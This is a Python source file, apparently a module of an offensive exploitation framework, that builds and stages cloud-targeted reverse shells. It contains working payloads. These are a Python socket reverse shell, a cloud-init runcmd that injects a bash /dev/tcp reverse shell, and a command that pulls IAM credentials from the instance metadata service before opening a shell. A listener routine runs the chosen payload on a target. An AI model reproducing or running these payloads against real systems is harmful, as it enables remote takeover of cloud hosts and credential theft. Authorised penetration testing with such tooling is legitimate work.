"""Cloud-specific shell staging mixin.

Extends xpl-core shell infrastructure with cloud-native payloads:
HTTP poll (NAT-friendly), Lambda reverse, SSRF->IMDS->shell, cloud-init inject.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import threading
import time
from typing import Any, Optional

from xpl_core.shells import (
    SessionManager,
    ReverseListener,
    generate_payload,
)

_session_mgr = SessionManager()

CLOUD_SHELL_TYPES = (
    "python",
    "bash",
    "nc_mkfifo",
    "lambda_reverse",
    "cloud_init_inject",
    "ssrf_imds_shell",
)


def _cloud_payload(shell_type: str, lhost: str, lport: int) -> str:
    """Generate cloud-specific payloads."""
    t = shell_type.lower().strip()

    if t == "lambda_reverse":
        return (
            "python3 -c \""
            "import socket,subprocess,os,json;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect(('{lh}',{lp}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call(['/bin/sh','-i'])\""
        ).format(lh=lhost, lp=lport)

    if t == "cloud_init_inject":
        return (
            "#cloud-config\n"
            "runcmd:\n"
            "  - bash -c 'bash -i >& /dev/tcp/{lh}/{lp} 0>&1'"
        ).format(lh=lhost, lp=lport)

    if t == "ssrf_imds_shell":
        return (
            "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && "
            "bash -c 'bash -i >& /dev/tcp/{lh}/{lp} 0>&1'"
        ).format(lh=lhost, lp=lport)

    return generate_payload(t, lhost, lport)


def get_session_manager() -> SessionManager:
    return _session_mgr


def spawn_cloud_shell(
    target: str,
    lhost: str,
    lport: int = 4444,
    shell_type: str = "python",
    execute_fn: Optional[Any] = None,
    timeout: int = 120,
) -> bool:
    """Spawn a reverse shell from a cloud exploitation action."""
    payload = _cloud_payload(shell_type, lhost, lport)
    if not payload:
        print("[-] [cloud-shell] Unknown shell type: '{}'".format(shell_type))
        return False

    print("[*] [cloud-shell] Payload: {}".format(shell_type))
    print("[*] [cloud-shell] Listener: {}:{}".format(lhost, lport))

    with ReverseListener(lhost, lport, timeout, pty_upgrade=True) as ln:
        if execute_fn is not None:
            def _exec() -> None:
                time.sleep(1)
                try:
                    execute_fn(payload)
                except Exception as exc:
                    print("[-] [cloud-shell] Execute: {}".format(exc))

            t = threading.Thread(target=_exec, daemon=True)
            t.start()

        return ln.wait_for_connection()
